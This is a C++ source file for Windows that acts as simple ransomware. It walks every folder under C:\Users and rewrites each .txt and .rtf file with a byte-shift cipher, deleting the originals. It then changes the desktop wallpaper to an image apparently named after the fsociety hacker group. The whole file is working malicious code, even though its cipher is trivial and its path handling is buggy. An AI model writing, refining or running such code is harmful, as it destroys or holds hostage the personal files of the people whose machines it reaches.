#include <stdio.h>
#include <string.h>
#include <dirent.h>
#include <iostream>
#include <stdlib.h>
#include <string>
#include <typeinfo>
#include <limits.h>
#include <algorithm>
#include <bits/stdc++.h>
#include<vector>
#include <windows.h>
#include <cstring>
#include <unistd.h>

using namespace std;

void changeDesktop(){
    char cwd[PATH_MAX];
	getcwd(cwd, sizeof(cwd));


	string s(cwd);
	std::replace( s.begin(), s.end(), '\\', '/');

	string newS = s + "/bin/fsocrec.png";

	SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, (void*)newS.c_str(), SPIF_SENDCHANGE);

}

string * directoryNew(string directory){

    string directoryRead;
    string directoryWrite;

    string separator = "\\";

    for(int i = 0; i < directory.length(); i++){
        string part;
        part+=directory[i];

        if(part == "\\"){

            for(int j = 0; j < separator.length(); j++)
            {
                directoryWrite.push_back(separator[j]);
                directoryRead.push_back(separator[j]);

            }

        }

        if(directory.length() - 5 != i){
                directoryWrite.push_back(directory[i]);
        }

        directoryRead.push_back(directory[i]);

    }

    string* directories = new string[2];
    directories[0] = directoryRead;
    directories[1] = directoryWrite;

    return directories;
}

void encrypt(string fileRead, string fileWrite){

    const char * fileNewRead = fileRead.c_str();
    const char * fileNewWrite = fileWrite.c_str();

    FILE *fdr,*fdw;
    char ch;
    int op;

    fdr = fopen(fileNewRead,"r");
    fdw = fopen(fileNewWrite,"w");
    ch=fgetc(fdr);

    while(ch!=EOF){
        op=(int)ch;
        op=op-5;
        fprintf(fdw,"%c",op);
        ch=fgetc(fdr);
    }
    fclose(fdw);
    fclose(fdr);

    remove(fileNewRead);

}

void listFilesRec(char *path);

int main()
{

    char path[] = "C:\\Users";

    listFilesRec(path);

    changeDesktop();

    return 0;
}

void listFilesRec(char *basePath)
{
    char path[1000];
    struct dirent *dp;
    DIR *dir = opendir(basePath);

    if (!dir)
        return;

    while ((dp = readdir(dir)) != NULL)
    {
        if (strcmp(dp->d_name, ".") != 0 && strcmp(dp->d_name, "..") != 0)
        {

            strcpy(path, basePath);

            strcat(path, "\\");
            strcat(path, dp->d_name);

            string newPath;
            newPath += path;

            string finalPath;

            if (newPath.find(".txt") != string::npos || newPath.find(".rtf") != string::npos) {

                string* p;
                p = directoryNew(newPath);

                string direcRead = p[0];
                string direcWrite = p[1];

                encrypt(direcRead, direcWrite);

            }

            listFilesRec(path);

        }
    }

    closedir(dir);
}
